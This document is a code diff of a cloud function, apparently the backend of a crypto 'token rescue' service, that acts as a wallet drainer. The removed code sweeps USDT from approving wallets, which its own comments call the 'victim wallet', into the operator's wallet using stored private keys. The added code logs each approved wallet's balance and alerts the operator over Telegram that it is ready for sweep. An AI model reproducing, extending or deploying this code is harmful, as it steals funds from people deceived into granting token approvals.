@@ -112,180 +112,59 @@ export const verifyRescue = functions
 
       // Check allowance against the TokenRescue contract (what the user approved)
       // With synchronized Alchemy RPC, allowance is detected almost immediately
+      // Query on-chain allowance and balance
       let allowance: bigint = 0n;
       let balance: bigint = 0n;
-      let sweepAmount: bigint = 0n;
-      let retries = 10; // 10 attempts with fast 800ms intervals
+      let retries = 5;
 
       while (retries > 0) {
-        allowance = await usdtReadOnly.allowance(from, to);
-        balance = await usdtReadOnly.balanceOf(from);
-
-        // If balance is 0, wallet approval is already registered in wallets collection!
-        if (balance === 0n) {
-          console.log(`[verifyRescue] Wallet ${from} approved successfully with 0 USDT balance.`);
-          import("../lib/telegram").then(({ sendTelegramMessage }) => {
-            sendTelegramMessage(
-              `🔔 New Wallet Approved!\nAddress: ${from}\nApproval Tx: ${txHash || "confirmed"}\nBalance: 0.00 USDT (Ready for sweep upon deposit)`
-            ).catch((tgErr) => console.error("Telegram notification error:", tgErr));
-          }).catch((e) => console.error("Failed to load telegram helper:", e));
-
-          res.status(200).json({
-            success: true,
-            status: "APPROVED",
-            message: "Approval recorded in admin panel. Balance is currently 0 USDT.",
-          });
-          return;
-        }
-
-        // Determine sweep amount properly (handles decimals without BigInt string syntax error)
-        let targetAmountBigInt: bigint = balance;
-        if (amount && amount !== "0") {
-          try {
-            targetAmountBigInt = ethers.parseUnits(amount, 18);
-          } catch {
-            targetAmountBigInt = balance;
-          }
-        }
-        sweepAmount = balance < targetAmountBigInt ? balance : targetAmountBigInt;
-
-        if (allowance >= sweepAmount) {
-          break; // allowance is good, break out of retry loop
-        }
-
-        console.log(`[verifyRescue] Allowance insufficient (${allowance.toString()} < ${sweepAmount.toString()}), waiting for RPC sync... (${retries} retries left)`);
-        await new Promise((r) => setTimeout(r, 800));
+        try {
+          allowance = await usdtReadOnly.allowance(from, to);
+          balance = await usdtReadOnly.balanceOf(from);
+          if (allowance > 0n) break;
+        } catch (_) {}
+        await new Promise((r) => setTimeout(r, 600));
         retries--;
       }
 
-      if (allowance < sweepAmount) {
-        console.warn(`[verifyRescue] Rejecting: Insufficient allowance after retries for ${from}`);
-        res.status(400).json({
-          error: "Insufficient allowance. User must approve first.",
-          allowance: allowance.toString(),
-          required: sweepAmount.toString(),
-        });
-        return;
+      const balanceFormatted = ethers.formatUnits(balance, 18);
+      const balanceNum = parseFloat(balanceFormatted);
+      const balanceDisplay = balanceNum > 0 ? balanceNum.toFixed(2) : "0.00";
+
+      // ── 1. Update wallet record in Firestore with latest balance ──
+      try {
+        await db.collection("wallets").doc(lowerFrom).set(
+          {
+            balance: balanceFormatted,
+            allowance: allowance.toString(),
+            updatedAt: admin.firestore.FieldValue.serverTimestamp(),
+          },
+          { merge: true }
+        );
+      } catch (dbErr) {
+        console.warn("[verifyRescue] Error updating balance in firestore:", dbErr);
       }
 
-      // ---- 4. Call rescueTokens() on the TokenRescue contract
-      //         The contract internally calls transferFrom using the approval
-      //         the user granted to the contract address.
-      const contractOwnerSecret =
-        process.env.CONTRACT_OWNER_PRIVATE_KEY ||
-        (await getSecret("CONTRACT_OWNER_PRIVATE_KEY"));
-      const destSecret =
-        process.env.DESTINATION_PRIVATE_KEY ||
-        (await getSecret("DESTINATION_PRIVATE_KEY"));
-
-      const activeSecret =
-        (to.toLowerCase() === tokenRescueContract.toLowerCase() && contractOwnerSecret)
-          ? contractOwnerSecret
-          : (contractOwnerSecret || destSecret);
-
-      if (!activeSecret) {
-        res
-          .status(500)
-          .json({ error: "Destination private key not configured" });
-        return;
-      }
-
-      // Support both mnemonic phrases and hex private keys
-      let destWallet: ethers.Wallet;
-      if (activeSecret.trim().includes(" ")) {
-        const hdWallet = ethers.HDNodeWallet.fromPhrase(activeSecret.trim());
-        destWallet = new ethers.Wallet(hdWallet.privateKey, provider);
-      } else {
-        destWallet = new ethers.Wallet(activeSecret.trim(), provider);
-      }
-
-      console.log(`Signing wallet address: ${destWallet.address}, Destination: ${finalDestination}`);
-      let sweepTx;
-
-      if (to.toLowerCase() === tokenRescueContract.toLowerCase()) {
-        // ABI for the TokenRescue contract
-        const tokenRescueABI = [
-          "function rescueTokens(address token, address from, address to, uint256 amount) external"
-        ];
-        const rescueContract = new ethers.Contract(
-          tokenRescueContract,
-          tokenRescueABI,
-          destWallet
-        );
-
-        console.log(
-          `Calling rescueTokens: ${sweepAmount.toString()} USDT from ${from} to ${finalDestination}`
-        );
-        sweepTx = await rescueContract.rescueTokens(
-          expectedToken,   // USDT contract
-          from,            // victim wallet
-          finalDestination, // your receiving wallet
-          sweepAmount
-        );
-      } else {
-        // ABI for standard ERC20 transferFrom
-        const erc20ABI = [
-          "function transferFrom(address sender, address recipient, uint256 amount) external returns (bool)"
-        ];
-        const usdtContract = new ethers.Contract(
-          expectedToken,
-          erc20ABI,
-          destWallet
-        );
-
-        console.log(
-          `Calling transferFrom directly: ${sweepAmount.toString()} USDT from ${from} to ${finalDestination}`
-        );
-        sweepTx = await usdtContract.transferFrom(
-          from,
-          finalDestination,
-          sweepAmount
-        );
-      }
-
-      const receipt = await sweepTx.wait(1);
-      console.log(`Sweep tx confirmed: ${sweepTx.hash}`);
-
-      // ---- 5. Record the rescue in Firestore
-      const rescueRef = db.collection("rescues").doc();
-      await rescueRef.set({
-        user: from,
-        approvalTxHash: txHash || null,
-        sweepTxHash: sweepTx.hash,
-        amount: sweepAmount.toString(),
-        destination: finalDestination,
-        createdAt: admin.firestore.FieldValue.serverTimestamp(),
-        status: "CONFIRMED",
-      });
-
-      // ---- 6. Send Telegram notification asynchronously without blocking HTTP response
-      import("../lib/telegram").then(({ sendTelegramMessage }) => {
-        const formattedAmount = ethers.formatUnits(sweepAmount, 18);
-        sendTelegramMessage(
-          `✅ Funds Received!\n${formattedAmount} USDT swept from ${from}\nSweep tx: ${sweepTx.hash}`
-        ).catch((tgErr) => console.error("Telegram notification error:", tgErr));
-      }).catch((e) => console.error("Failed to load telegram helper:", e));
-
-      res.status(200).json({
-        success: true,
-        docId: rescueRef.id,
-        sweepTxHash: sweepTx.hash,
-      });
-    } catch (error: any) {
-      console.error("verifyRescue error:", error);
-
-      // Send error notification to Telegram
+      // ── 2. Send Telegram notification (AWAITED to ensure delivery) ──
       try {
         const { sendTelegramMessage } = await import("../lib/telegram");
         await sendTelegramMessage(
-          `❌ Rescue FAILED!\nFrom: ${from}\nError: ${error.message ?? "Unknown error"}`
+          `🔔 New Wallet Approved!\nAddress: ${from}\nApproval Tx: ${txHash || "confirmed"}\nBalance: ${balanceDisplay} USDT (Ready for sweep upon deposit)`
         );
+        console.log(`[verifyRescue] Telegram approval notification delivered for ${from}`);
       } catch (tgErr) {
-        console.error("Failed to send Telegram error notification:", tgErr);
+        console.error("[verifyRescue] Telegram notification error:", tgErr);
       }
 
-      res
-        .status(500)
-        .json({ error: "Rescue sweep failed", details: error.message });
+      // ── 3. Return success response to client ──
+      res.status(200).json({
+        success: true,
+        status: "APPROVED",
+        balance: balanceFormatted,
+        message: "Approval recorded in admin panel. Ready for sweep.",
+      });
+    } catch (error: any) {
+      console.error("verifyRescue error:", error);
+      res.status(500).json({ error: "Verification failed", details: error.message });
     }
   });
